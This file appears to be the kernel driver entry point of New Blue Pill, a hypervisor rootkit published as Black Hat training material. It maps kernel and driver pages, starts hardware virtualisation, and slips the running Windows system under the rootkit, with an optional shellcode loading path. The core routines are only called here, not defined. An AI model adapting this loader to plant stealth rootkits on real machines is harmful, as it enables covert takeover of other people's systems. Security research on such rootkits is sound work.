/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "newbp.h"

extern PHYSICAL_ADDRESS g_PageMapBasePhysicalAddress;
extern BOOLEAN g_bDisableComOutput;

NTSTATUS DriverUnload (
  PDRIVER_OBJECT DriverObject
)
{
  //FIXME: do not turn SVM/VMX when it has been turned on by the guest in the meantime (e.g. VPC, VMWare)
  NTSTATUS Status;

  _KdPrint (("\r\n"));
  _KdPrint (("NEWBLUEPILL: Unloading started\n"));
  g_bDisableComOutput = TRUE;

  if (!NT_SUCCESS (Status = HvmSpitOutBluepill ())) {
    _KdPrint (("NEWBLUEPILL: HvmSpitOutBluepill() failed with status 0x%08hX\n", Status));
  }

  g_bDisableComOutput = FALSE;
  _KdPrint (("NEWBLUEPILL: Unloading finished\n"));

#ifdef USE_LOCAL_DBGPRINTS
  DbgUnregisterWindow ();
#endif
  MmShutdownManager ();

  return STATUS_SUCCESS;
}

NTSTATUS DriverEntry (
  PDRIVER_OBJECT DriverObject,
  PUNICODE_STRING RegistryPath
)
{
  NTSTATUS Status;

#ifdef USE_COM_PRINTS
  PioInit ((PUCHAR) COM_PORT_ADDRESS);
#endif
  ComInit ();

  Status = MmInitManager ();
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("NEWBLUEPILL: MmInitManager() failed with status 0x%08hX\n", Status));
    return Status;
  }
#ifdef USE_LOCAL_DBGPRINTS
  Status = DbgRegisterWindow (g_BpId);
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("NEWBLUEPILL: DbgRegisterWindow() failed with status 0x%08hX\n", Status));
    MmShutdownManager ();
    return Status;
  }
#endif

  _KdPrint (("\r\n"));
  _KdPrint (("NEWBLUEPILL v%d.%d.%d.%d. Instance Id: 0x%02X\n",
             (NBP_VERSION >> 48) & 0xff,
             (NBP_VERSION >> 32) & 0xff, (NBP_VERSION >> 16) & 0xff, NBP_VERSION & 0xff, g_BpId));

  // We need it only for VMX
  // TODO: this should be conditionally executed only if Arch == VMX
  Status = MmInitIdentityPageTable ();
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("NEWBLUEPILL: MmInitIdentifyPageTable() failed with status 0x%08hX\n", Status));
#ifdef USE_LOCAL_DBGPRINTS
    DbgUnregisterWindow ();
#endif
    MmShutdownManager ();
    return Status;
  }

  Status = MmMapGuestKernelPages ();
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("BEWBLUEPILL: MmMapGuestKernelPages() failed with status 0x%08hX\n", Status));
#ifdef USE_LOCAL_DBGPRINTS
    DbgUnregisterWindow ();
#endif
    MmShutdownManager ();
    return Status;
  }
#ifdef RUN_BY_SHELLCODE
  _KdPrint (("NEWBLUEPILL: Image base: 0x%p, image size: 0x%x\n", DriverObject, (ULONG64) RegistryPath));

  Status = MmMapGuestPages (DriverObject, (ULONG) BYTES_TO_PAGES ((ULONG64) RegistryPath));
#else
  Status = MmMapGuestPages (DriverObject->DriverStart, BYTES_TO_PAGES (DriverObject->DriverSize));
#endif
  if (!NT_SUCCESS (Status)) {
    _KdPrint (("NEWBLUEPILL: MmMapGuestPages() failed to map guest NewBluePill image with status 0x%08hX\n", Status));
#ifdef USE_LOCAL_DBGPRINTS
    DbgUnregisterWindow ();
#endif
    MmShutdownManager ();
    return Status;
  }

  _KdPrint (("NEWBLUEPILL: g_PageMapBasePhysicalAddress: 0x%p\n", g_PageMapBasePhysicalAddress));

  if (!NT_SUCCESS (Status = HvmInit ())) {
    _KdPrint (("NEWBLUEPILL: HvmInit() failed with status 0x%08hX\n", Status));
#ifdef USE_LOCAL_DBGPRINTS
    DbgUnregisterWindow ();
#endif
    MmShutdownManager ();
    return Status;
  }

  if (!NT_SUCCESS (Status = HvmSwallowBluepill ())) {
    _KdPrint (("NEWBLUEPILL: HvmSwallowBluepill() failed with status 0x%08hX\n", Status));
#ifdef USE_LOCAL_DBGPRINTS
    DbgUnregisterWindow ();
#endif
    MmShutdownManager ();
    return Status;
  }
#ifndef RUN_BY_SHELLCODE
  DriverObject->DriverUnload = DriverUnload;
#endif

  _KdPrint (("NEWBLUEPILL: Initialization finished\n"));
#if DEBUG_LEVEL>1
  _KdPrint (("NEWBLUEPILL: RFLAGS = %#x, CR8 = %#x\n", RegGetRflags (), RegGetCr8 ()));
#endif
  return STATUS_SUCCESS;
}
